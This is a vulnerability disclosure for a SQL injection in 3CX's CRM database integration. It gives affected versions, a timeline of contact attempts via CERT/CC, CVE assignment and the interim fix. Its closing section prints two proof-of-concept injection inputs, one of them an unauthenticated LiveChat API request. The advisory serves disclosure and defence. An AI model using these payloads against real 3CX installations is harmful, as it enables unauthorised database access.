# SQL Injection in 3CX CRM Integration
For the CRM integration, 3CX ships templates for connecting to various databases.  
In these templates, placeholders (`[FirstName]`,`[SearchText]`,`[Email]`) are used to populate the queries.  
User input is not sanitized and thus enables SQL injections.

## Affected Versions
- < 18.0.9.23
- < 20.0.0.1494

## Affected CRM Solutions
- Database MsSQL
- Database MySQL
- Database PostgreSQL

## Related Documentation
https://www.3cx.com/docs/sql-database-pbx-integration/

## Timeline
- 2023-10-11 - Discovery of the security issue by pure coincidence
- 2023-10-11 - Email to 3CX Data Protection Officer requesting a contact for Responsible Disclosure
- 2023-10-11 - Reply from 3CX customer support asking for my license details
- 2023-10-11 - Reply to 3CX that I do not provide license information as this has nothing to do with the matter
- 2023-10-12 - Opening a case with CERT/CC to assist me with contacting 3CX
- 2023-10-13 - CERT/CC accepted my case and tried to contact 3CX
- 2023-10-17 - Another contact attempt by me to 3CX customer support
- 2023-10-26 - Ask CERT/CC if they have received an answer from 3CX
- 2023-10-26 - CERT/CC received no answer, they try again
- 2023-11-02 - Email to 3CX CEO Nick Galea (with an e-mail address found online) -> no reply
- 2023-11-27 - CERT/CC informed me that the deadline they had set had expired and there was no response from 3CX
- 2023-11-28 - Request for CVE sent to MITRE
- 2023-12-03 - CVE was assigned
- 2023-12-14 - Publication
- 2023-12-15 - Tested whether 18.0 Update 9 is affected
- 2023-12-15 - Informed 3CX about the publication
- 2023-12-15 - Response from 3CX Operations Director
- 2023-12-15 - 3CX published a [blog post](https://www.3cx.com/blog/news/sql-database-integration/)
- 2023-12-17 - 3CX published a detailed [blog post](https://www.3cx.com/blog/news/sql-database-integration-update/)

## Fix
3CX will soon provide a hotfix (18.0.9.23, 20.0.0.1494) which fixes the issue, until then the only option is to deactivate the CRM integration by setting the CRM solution to `None` (see blog post for illustrated instructions).

## Attack Vectors
The CRM integration queries are executed at various points, e.g. when creating or searching contacts in the WebClient and even the public LiveChat API.  
Below are two examples.  

### WebClient (authenticated)
- Statement __Search Contacts SQL Statement__: `SELECT * FROM tbl WHERE name LIKE '%[SearchText]%'`  
- Perform contact search: `'OR 1=1 --`  
- Executed SQL Query: `SELECT * FROM tbl WHERE name LIKE '%'OR 1=1 --%'`  

### LiveChat API (unauthenticated)
- Statement __Lookup By Email__: `SELECT * FROM tbl WHERE email = '[Email]'`  
- GET request: `https://3cx-hostname/MyPhone/c2clogin?login=true&c2cid=LiveChatXXXX&email=x%27--%40example.com&displayname=x`  
- Executed SQL Query: `SELECT * FROM tbl WHERE email = 'x'--@example.com'`  
